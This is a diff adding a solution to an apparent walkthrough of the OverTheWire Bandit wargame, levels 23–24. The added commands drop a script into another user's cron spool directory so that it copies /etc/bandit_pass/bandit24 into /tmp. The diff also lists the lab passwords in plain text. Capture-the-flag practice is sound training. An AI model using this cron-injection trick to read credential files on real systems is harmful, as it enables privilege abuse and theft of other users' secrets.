@@ -201,5 +201,19 @@ cat $(cat /usr/bin/cronjob_bandit23.sh | sed "s/\$myname/bandit23/" | bash 2>/de
 pass: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 
 ```bash
+mkdir -p /tmp/advik/
+cd /tmp/advik
+echo "mkdir -p /tmp/advik-pass24/; cat /etc/bandit_pass/bandit24 >> /tmp/advik-pass24/pass" > pass.sh
+chmod +x pass.sh
+cp pass.sh /var/spool/bandit24/foo/
+seq 45 | xargs -I{} sh -c 'echo "please wait... {}/45"; sleep 1.5'
+cat /tmp/advik-pass24/pass
+```
+
+## Level 24
+
+pass: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+```bash
 
 ```
